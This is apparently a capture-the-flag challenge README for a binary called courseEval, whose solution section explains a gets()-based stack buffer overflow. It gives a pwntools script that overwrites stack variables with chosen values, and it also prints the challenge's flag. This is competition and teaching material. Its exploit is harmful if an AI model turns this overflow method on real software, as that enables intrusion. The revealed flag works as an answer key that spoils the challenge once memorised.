# CourseEvaluation

### 📄 Description

Give us a good feedback and we might give you the flag!


### ⚙ How to use
```bash
./courseEval
```

### ⛔ Rules
- You cannot patch this binary.
- The challenge MUST BE SOLVED by providing an appropriate input.
- Solutions that jump directly to the print flag function WILL NOT BE CONSIDERED.
- Do not modify the `flag.txt` file.

<details>
    <summary>
        <h2>🔑 Solution</h2>
    </summary>

We have a trivial buffer overflow vulnerability, we just need to overwrite some stack variables with the correct values.
The input length isn't checked due to the use of `gets()` for handling user input, the target buffer is 50 bytes long, its content aren't checked against anything so we can just fill it with `A`s.
The only important thing here is overwriting the variables with the correct value and in the correct order (that's easily checked by looking at the variables position in the stack).

```python
from pwn import *

context.binary = "./courseEval"
p = process()
p.sendline(b"A" * 56 + b"UniPD_01" + b"CPP-" + b"PWN-" + b"Pier")

log.success(p.recvline_regex(rb"SPRITZ{.*}").decode("ascii"))

```

<h3> 🚩 Flag </h3>

```plain
SPRITZ{CPP_PWNs_Everything_173453}
```
</details>
